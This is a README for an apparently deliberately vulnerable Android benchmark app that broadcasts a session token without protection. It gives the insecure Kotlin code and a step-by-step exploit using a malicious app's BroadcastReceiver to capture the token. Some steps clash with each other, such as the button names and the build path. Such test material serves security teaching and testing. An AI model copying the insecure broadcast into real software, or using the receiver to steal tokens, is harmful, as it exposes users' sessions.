# oxo-android-ben46 Broadcast of Sensitive Information

### Description

This project demonstrates a critical security vulnerability in an Android application where sensitive information is broadcast without proper protection.  

The app simulates a simple login/authentication flow. When the user clicks the **"Authenticate"** button:
- A temporary session token is generated (randomized using `UUID.randomUUID()` to mimic realistic tokens).
- This token is then **broadcast** using `context.sendBroadcast()` with the action `com.example.token`.  

Since the broadcast is **unprotected**, any other app on the device can intercept the token.  

After "authentication," the button changes to **"Go to Dashboard"**, which redirects the user to a webpage. This masks the vulnerability, as the user only sees expected app behavior.

The vulnerability is located in the `MainActivity.kt` file.

**Relevant Code (MainActivity.kt):**
```kotlin
val token = "temp_token_${UUID.randomUUID()}"

// Broadcast token (insecure behavior)
val tokenIntent = Intent("com.example.token").apply {
    putExtra("TOKEN", token)
}
context.sendBroadcast(tokenIntent)
```

### Vulnerability Type and Category
-   **Type:** Unprotected broadcast of sensitive information
-   **Category:** Unprotected broadcast of sensitive information

### Difficulty
Easy

## Build and Test Instructions

### Build

This project uses Android Studio with Kotlin. To build the debug APK from the terminal:
```bash
# Navigate into the source code directory first
cd src/
./gradlew build
```
The APK will be located at app/build/outputs/apk/release/app-release-unsigned.apk.

### How to Exploit

1. **Install the Vulnerable App**: Install the `oxo-android-ben46.apk` onto an Android device or emulator.

```
adb install oxo-android-ben46.apk 
```

2. **Set Up the Malicious App**: Create a second, malicious app with a `BroadcastReceiver` that includes an intent filter for the vulnerable broadcast action (`com.example.token`).

In `AndroidManifest.xml`:
```
<receiver android:name=".TokenReceiver" android:exported="true">
    <intent-filter>
        <action android:name="com.example.token" />
    </intent-filter>
</receiver>
```

In the `TokenReceiver.kt`:

```
override fun onReceive(context: Context?, intent: Intent?) {
    if (intent?.action == "com.example.token") {
        val token = intent.getStringExtra("TOKEN")
        Log.d("VulnerableBroadcast", "Intercepted token: $token")
    }
}
```

3 **Install the Malicious App**: Install the malicious app on the same device.

```
abd install malicious-app.apk
```

4. **Trigger the Vulnerability**: Open the vulnerable app and click the "Open example.com" button.

5. **View the Exploit**: Use `adb logcat` to filter the logs for the malicious app's tag. You will see the intercepted token in the logs, confirming that the malicious app successfully captured the sensitive information from the broadcast.

```
adb logcat -s VulnerableBroadcast
```